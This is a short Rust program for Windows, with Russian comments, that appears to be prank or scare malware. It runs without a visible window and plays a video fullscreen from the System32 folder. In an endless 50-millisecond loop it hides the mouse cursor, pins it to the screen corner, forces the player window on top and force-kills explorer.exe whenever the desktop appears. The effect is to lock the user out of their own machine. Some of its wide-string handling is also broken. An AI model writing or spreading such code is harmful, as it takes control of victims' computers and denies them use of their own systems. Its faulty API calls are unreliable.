#![windows_subsystem = "windows"]
use std::process::Command;
use winapi::um::winuser::{FindWindowW, SetWindowLongW, GWL_EXSTYLE, WS_EX_TOPMOST, WS_EX_NOACTIVATE, WS_EX_TOOLWINDOW, ShowWindow, SW_SHOWMAXIMIZED, SetForegroundWindow, BringWindowToTop, ShowCursor, FALSE, SetCursorPos};
use std::ptr::null_mut;

fn mock_popup(text: &str) {
    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONEXCLAMATION, MB_SYSTEMMODAL};
    let wide: Vec<u16> = text.encode_utf16().chain(Some(0)).collect();
    unsafe {
        MessageBoxW(
            null_mut(),
            wide.as_ptr(),
            "System Alert\0".as_ptr() as *const u16,
            MB_OK | MB_ICONEXCLAMATION | MB_SYSTEMMODAL
        );
    }
}
// Вызов в цикле при обнаружении любого из этих окон

fn main() {
    let video = std::env::var("SYSTEMROOT").unwrap() + "\\System32\\video.mp4";
    Command::new("wmplayer")
        .arg(&video)
        .args(["/fullscreen", "/play", "/close"])
        .spawn().ok();

    loop {
        unsafe {
            ShowCursor(FALSE);
            SetCursorPos(0, 0);
            let hwnd = FindWindowW("WMPlayerApp".as_ptr() as *const u16, null_mut());
            if !hwnd.is_null() {
                SetWindowLongW(hwnd, GWL_EXSTYLE, (WS_EX_TOPMOST | WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW) as i32);
                ShowWindow(hwnd, SW_SHOWMAXIMIZED);
                SetForegroundWindow(hwnd);
                BringWindowToTop(hwnd);
            }
            // Издевательство при обнаружении explorer
            let exp = FindWindowW("Progman".as_ptr() as *const u16, null_mut());
            if !exp.is_null() {
                Command::new("taskkill").args(["/f", "/im", "explorer.exe"]).status().ok();
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
}
